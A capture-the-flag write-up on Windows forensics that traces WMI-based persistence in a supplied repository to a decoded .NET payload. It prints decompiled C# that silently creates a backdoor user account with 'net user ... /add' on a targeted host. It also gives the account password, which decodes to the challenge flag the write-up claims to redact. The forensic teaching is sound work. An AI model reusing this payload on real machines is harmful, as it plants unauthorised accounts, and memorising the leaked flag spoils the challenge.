# Day 12: After Hours

- **Challenge:** [After Hours]()
- **Category:** Forensics / Windows Persistence
- **Difficulty:** TBD
- **Date completed:** 8th of August 2026

## Summary

This room drops you a set of raw Windows artifacts and tells you someone has been logging into the resort's back-office machines after hours. The catch: nothing shows up in Startup, Scheduled Tasks, or the registry Run keys. The hint from @0xMia in the brief was that normal autoruns-style tools miss this one completely, so the persistence had to be hiding somewhere those tools don't check.

The five files handed out (INDEX.BTR, MAPPING1.MAP, MAPPING2.MAP, MAPPING3.MAP, OBJECTS.DATA) turned out to be a full Windows WMI Repository - the exact structure Windows keeps at `C:\Windows\System32\wbem\Repository\`. WMI Event Subscriptions are a classic "invisible" persistence technique for this reason: they live in a CIM database, not in any of the usual autorun locations.

## Exploitation / Walkthrough

### Step 1: Extract the attachment

The room's `after-hours.7z` needed `7z` instead of `unzip`, since it's a 7-Zip archive, not a zip file:

```
7z x '/root/Rooms/hacker-holidays-2026/after-hours/after-hours.7z'
```

Password: `Aft3rH0ursAtt4chm3ntP4ss`. This unpacked the five WMI repository files.

### Step 2: Confirm what we're looking at

`file` on the extracted files just said "data", but the filenames themselves (`INDEX.BTR`, `MAPPING1-3.MAP`, `OBJECTS.DATA`) are a dead giveaway for a WMI CIM repository. `OBJECTS.DATA` is the file that actually holds class definitions and instance data.

### Step 3: Sweep for a custom class

Standard WMI classes (`Win32_*`, `CIM_*`, `MSFT_*`, `__EventFilter`, `__EventConsumer`, etc.) are all over the file, since they're part of the built-in schema. To find the attacker's own class, I filtered those out:

```
strings -n 6 OBJECTS.DATA | grep -oE '^[A-Za-z_][A-Za-z0-9_]{3,60}$' \
  | grep -vE '^(Win32_|CIM_|MSFT_|Msft_|MS_|__|...)' | sort -u
```

### Step 4: Hunt for an embedded blob

Ran a search for long base64-looking strings, both as plain ASCII and as UTF-16LE (since WMI often stores string properties that way):

```
strings -n 40 OBJECTS.DATA | grep -E '^[A-Za-z0-9+/]{40,}={0,2}$'
strings -e l -n 40 OBJECTS.DATA | grep -E '^[A-Za-z0-9+/]{40,}={0,2}$'
```

This surfaced one long (~1786 char) base64 blob repeated multiple times in the file - a strong signal it was a stored property value rather than noise.

### Step 5: Decode the blob

Base64-decoding it gave 1658 bytes of high-entropy binary - not a recognizable file signature on its own. zlib/gzip/bz2/lzma all failed, until trying **raw deflate** (no zlib header):

```python
import zlib
data = base64.b64decode(blob)
out = zlib.decompressobj(-15).decompress(data)
```

That unpacked cleanly into an `MZ` header - a PE32 .NET assembly, about 4KB.

### Step 6: Decompile the payload with ILSpy

The room provides ILSpy for exactly this step. Got it running on the AttackBox:

```
cd artifacts/linux-x64
chmod +x ILSpy
./ILSpy
```

Opened `payload.exe` in ILSpy (`File > Open`), then navigated the tree to `AfterHours` -> `Program` -> `Main`. ILSpy decompiled it straight back to clean C#:

```csharp
// AfterHours.Program
using System;
using System.Diagnostics;

public static void Main()
{
	try
	{
		if (string.Equals(Environment.MachineName, "bytelotusdc", StringComparison.OrdinalIgnoreCase))
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = "cmd.exe";
			processStartInfo.Arguments = "/c net user patch VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9 /add";
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.CreateNoWindow = true;
			Process.Start(processStartInfo);
		}
		else
		{
			Console.WriteLine("Execution halted: Environment mismatch.");
		}
	}
	catch
	{
	}
}
```

Clear as day: it checks `Environment.MachineName` against `"bytelotusdc"` (so it only fires on the right host), and if it matches, silently runs `net user patch <base64> /add` - creating a hidden local user account, with the process window hidden and no console output. That's the actual persistence mechanism, and it explains exactly why Startup, Scheduled Tasks, and the registry Run keys never showed anything - the payload never touches any of them.

### Step 7: Decode the flag

The "password" for the `patch` account was itself base64:

```
echo "VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9" | base64 -d
```

And voila, there you have it!

## Flag

![REDACTED](https://img.shields.io/badge/flag-REDACTED-black)

The correct flag will be posted after the event concludes, to avoid spoilers.

## Lessons Learned

- WMI repository files (`INDEX.BTR`, `MAPPING*.MAP`, `OBJECTS.DATA`) are worth recognizing on sight - they're a persistence hiding spot that standard autoruns tools genuinely don't check.
- `strings` with the `-e l` flag (UTF-16LE) is essential when digging through Windows-originated binary formats, since a lot of string data won't show up with plain ASCII `strings`.
- Not every base64 blob decodes straight to something readable - "high entropy, no known file signature" often means one more layer (in this case, raw deflate with no zlib header) needs to be peeled off first.
- ILSpy turns a small .NET assembly straight back into readable C#, which made the persistence logic obvious at a glance instead of having to reason through raw IL.
- Attacker payloads sometimes gate themselves on `Environment.MachineName` or similar checks, so the "real" trigger condition can be hidden in code rather than in the persistence mechanism itself.